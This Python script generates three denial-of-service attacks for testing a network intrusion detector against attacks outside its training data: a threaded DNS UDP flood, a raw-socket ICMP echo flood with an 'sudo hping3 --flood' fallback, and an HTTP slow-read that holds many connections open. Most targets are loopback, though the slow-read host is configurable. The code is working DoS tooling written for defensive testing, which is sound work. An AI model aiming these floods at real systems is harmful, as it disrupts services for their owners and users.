#!/usr/bin/env python3
"""
gen_unknown_attacks.py — Three novel unknown attacks for zero-day testing
=========================================================================
All three attacks have flow signatures that are OUTSIDE the training data
of both XGBoost (6 known classes) and are expected to trigger high
Autoencoder anomaly scores.

ATTACK 1: DNS Flood
  - Protocol : UDP (17) to port 53
  - Pattern  : Thousands of tiny 60-byte UDP packets per second
  - Different from training because: ALL training attacks are TCP-based.
    No UDP port 53 traffic appears in any training class.

ATTACK 2: ICMP Flood
  - Protocol : ICMP (1), no ports
  - Pattern  : High-rate echo requests, uniform size
  - Different from training because: Training data has no ICMP class.
    Protocol field = 1 is almost never seen in benign or attack training data.

ATTACK 3: HTTP Slow Read
  - Protocol : TCP (6) to port 8080 (same as training)
  - Pattern  : Normal 3-way handshake, normal request sent, then client
    sets TCP receive window to 0 and reads 1 byte every 5 seconds.
    Server keeps entire response buffered for the full duration.
  - Different from training because: Normal HTTP = short duration, fast read.
    DOS = fast SYN flood. Slowloris = slow write. SlowRead = slow read.
    The flow stats (long duration + tiny bytes/sec from server side) are unique.

Usage:
    python3 attacks/gen_unknown_attacks.py --attack dns    [--duration 30]
    python3 attacks/gen_unknown_attacks.py --attack icmp   [--duration 30]
    python3 attacks/gen_unknown_attacks.py --attack slowread [--duration 60]
    python3 attacks/gen_unknown_attacks.py --attack all    [--duration 30]
"""
import argparse
import os
import random
import socket
import struct
import sys
import threading
import time

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 1: DNS Flood
# ─────────────────────────────────────────────────────────────────────────────

DNS_DOMAINS = [
    "google.com", "facebook.com", "amazon.com", "github.com", "python.org",
    "cloudflare.com", "microsoft.com", "apple.com", "netflix.com", "twitter.com",
    "stackoverflow.com", "wikipedia.org", "reddit.com", "linkedin.com", "youtube.com",
]

def _build_dns_query(domain: str) -> bytes:
    txid   = random.randint(0, 65535).to_bytes(2, "big")
    flags  = b"\x01\x00"
    counts = b"\x00\x01\x00\x00\x00\x00\x00\x00"
    qname  = b"".join(bytes([len(l)]) + l.encode() for l in domain.split(".")) + b"\x00"
    return txid + flags + counts + qname + b"\x00\x01\x00\x01"


def dns_flood_worker(target: str, port: int, end_time: float,
                     counters: dict, lock: threading.Lock):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.1)
    while time.time() < end_time:
        domain = random.choice(DNS_DOMAINS)
        pkt    = _build_dns_query(domain)
        try:
            sock.sendto(pkt, (target, port))
            with lock: counters["sent"] += 1
        except Exception:
            pass
    sock.close()


def run_dns_flood(duration: int, workers: int = 30):
    # Target systemd-resolved on loopback (always listening on 127.0.0.53:53)
    target = "127.0.0.53"
    port   = 53

    print("=" * 60)
    print("  ATTACK 1: DNS Flood (UDP)")
    print("=" * 60)
    print(f"  Target   : {target}:{port} (UDP)")
    print(f"  Workers  : {workers} concurrent sockets")
    print(f"  Duration : {duration}s")
    print(f"  Expected : ~{workers * duration * 500:,} tiny UDP flows")
    print(f"  Protocol : UDP (17) — NOT in any training class")
    print("=" * 60)

    counters = {"sent": 0}
    lock     = threading.Lock()
    end_time = time.time() + duration
    threads  = [threading.Thread(target=dns_flood_worker,
                                  args=(target, port, end_time, counters, lock),
                                  daemon=True)
                for _ in range(workers)]
    for t in threads: t.start()

    t0 = time.time()
    while time.time() < end_time:
        time.sleep(5)
        with lock:
            elapsed = time.time() - t0
            rate    = counters["sent"] / elapsed
            print(f"  [+{elapsed:4.0f}s] Sent={counters['sent']:,}  Rate={rate:.0f}/s")

    for t in threads: t.join(timeout=2)
    with lock:
        print(f"\n  DNS Flood done. Total queries sent: {counters['sent']:,}")
    print("=" * 60)


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 2: ICMP Flood (using raw socket or ping)
# ─────────────────────────────────────────────────────────────────────────────

def _icmp_checksum(data: bytes) -> int:
    s = 0
    for i in range(0, len(data) - 1, 2):
        s += (data[i] << 8) + data[i + 1]
    if len(data) % 2:
        s += data[-1] << 8
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff


def _build_icmp_echo(seq: int) -> bytes:
    header = struct.pack("!BBHHH", 8, 0, 0, os.getpid() & 0xFFFF, seq)
    payload = b"A" * 56
    chk    = _icmp_checksum(header + payload)
    return struct.pack("!BBHHH", 8, 0, chk, os.getpid() & 0xFFFF, seq) + payload


def icmp_flood_worker(target: str, end_time: float,
                      counters: dict, lock: threading.Lock):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        with lock: counters["error"] = "Need root for raw ICMP socket"
        return

    seq = random.randint(0, 1000)
    while time.time() < end_time:
        pkt = _build_icmp_echo(seq % 65535)
        try:
            sock.sendto(pkt, (target, 0))
            with lock: counters["sent"] += 1
        except Exception:
            pass
        seq += 1
    sock.close()


def run_icmp_flood(duration: int, workers: int = 20):
    target = "127.0.0.1"
    print("=" * 60)
    print("  ATTACK 2: ICMP Flood (Raw ICMP Echo)")
    print("=" * 60)
    print(f"  Target   : {target}")
    print(f"  Workers  : {workers} threads")
    print(f"  Duration : {duration}s")
    print(f"  Protocol : ICMP (1) — NOT in any training class")
    print("=" * 60)

    counters = {"sent": 0, "error": None}
    lock     = threading.Lock()
    end_time = time.time() + duration
    threads  = [threading.Thread(target=icmp_flood_worker,
                                  args=(target, end_time, counters, lock),
                                  daemon=True)
                for _ in range(workers)]
    for t in threads: t.start()

    t0 = time.time()
    while time.time() < end_time:
        time.sleep(5)
        with lock:
            if counters["error"]:
                print(f"  [ERROR] {counters['error']}")
                print(f"  → Using hping3 fallback instead...")
                # Fallback to hping3
                os.system(f"sudo hping3 --icmp --flood --count 50000 {target} "
                          f"> /tmp/icmp_flood.log 2>&1 &")
                break
            elapsed = time.time() - t0
            rate    = counters["sent"] / elapsed if elapsed > 0 else 0
            print(f"  [+{elapsed:4.0f}s] Sent={counters['sent']:,}  Rate={rate:.0f}/s")

    for t in threads: t.join(timeout=2)
    with lock:
        if not counters["error"]:
            print(f"\n  ICMP Flood done. Total packets: {counters['sent']:,}")
    print("=" * 60)


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 3: HTTP Slow Read
# ─────────────────────────────────────────────────────────────────────────────

def slow_read_worker(host: str, port: int, duration: float,
                     read_interval: float, counters: dict,
                     lock: threading.Lock):
    """
    HTTP Slow Read: connect, send a valid request, then read the response
    ONE BYTE AT A TIME with a long sleep between each byte.
    Server is forced to keep the connection open and buffer the response.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(duration + 10)
        sock.connect((host, port))

        # Send a complete, valid HTTP request for a large-ish response
        endpoint = random.choice(["/api/data", "/api/users", "/files/report.txt",
                                   "/", "/metrics"])
        request  = (
            f"GET {endpoint} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode()
        sock.send(request)

        with lock: counters["connected"] += 1

        end_time = time.time() + duration
        bytes_read = 0
        while time.time() < end_time:
            time.sleep(read_interval)
            try:
                # Read just 1 byte — force server to keep buffering
                data = sock.recv(1)
                if not data:
                    break
                bytes_read += 1
            except socket.timeout:
                break
            except Exception:
                break

        with lock: counters["bytes_read"] += bytes_read
    except Exception:
        with lock: counters["failed"] += 1
    finally:
        try: sock.close()
        except Exception: pass
        with lock: counters["closed"] += 1


def run_slow_read(host: str, port: int, duration: int,
                  connections: int = 100, read_interval: float = 3.0):
    print("=" * 60)
    print("  ATTACK 3: HTTP Slow Read")
    print("=" * 60)
    print(f"  Target     : {host}:{port}")
    print(f"  Connections: {connections}")
    print(f"  Duration   : {duration}s per connection")
    print(f"  Read rate  : 1 byte every {read_interval}s")
    print(f"  Protocol   : TCP (6) — but VERY different flow shape:")
    print(f"    Normal HTTP  : duration ~0.1s,  bytes/sec ~10,000")
    print(f"    Slow Read    : duration ~{duration}s, bytes/sec ~{1/read_interval:.2f}")
    print("=" * 60)

    # Verify service is up
    try:
        test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test.settimeout(3)
        test.connect((host, port))
        test.close()
    except Exception:
        print(f"\n[ERROR] Cannot reach {host}:{port}")
        print(f"        python3 services/start_http_service.py &")
        return

    counters = {"connected": 0, "bytes_read": 0, "failed": 0, "closed": 0}
    lock     = threading.Lock()
    threads  = []
    t0       = time.time()
    end_time = t0 + duration

    for i in range(connections):
        t = threading.Thread(
            target=slow_read_worker,
            args=(host, port, duration, read_interval, counters, lock),
            daemon=True,
        )
        t.start()
        threads.append(t)
        time.sleep(0.05)  # stagger connection openings

    while time.time() < end_time:
        time.sleep(10)
        elapsed = time.time() - t0
        with lock:
            print(f"  [+{elapsed:4.0f}s] Active={counters['connected']-counters['closed']}  "
                  f"Bytes read={counters['bytes_read']:,}  "
                  f"Failed={counters['failed']}")

    for t in threads: t.join(timeout=3)

    elapsed = time.time() - t0
    with lock:
        print(f"\n  Slow Read done in {elapsed:.1f}s")
        print(f"  Connections: {counters['connected']}  "
              f"Bytes read: {counters['bytes_read']:,}  "
              f"Failed: {counters['failed']}")
    print("=" * 60)


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Unknown attack generators for zero-day NIDS testing"
    )
    parser.add_argument("--attack",
                        choices=["dns", "icmp", "slowread", "all"],
                        required=True)
    parser.add_argument("--host",        default="127.0.0.1")
    parser.add_argument("--port",        type=int, default=8080)
    parser.add_argument("--duration",    type=int, default=30)
    parser.add_argument("--connections", type=int, default=100)
    parser.add_argument("--workers",     type=int, default=30)
    args = parser.parse_args()

    if args.attack in ("dns", "all"):
        run_dns_flood(args.duration, workers=args.workers)

    if args.attack in ("icmp", "all"):
        run_icmp_flood(args.duration, workers=args.workers)

    if args.attack in ("slowread", "all"):
        run_slow_read(args.host, args.port, args.duration,
                      connections=args.connections)


if __name__ == "__main__":
    main()
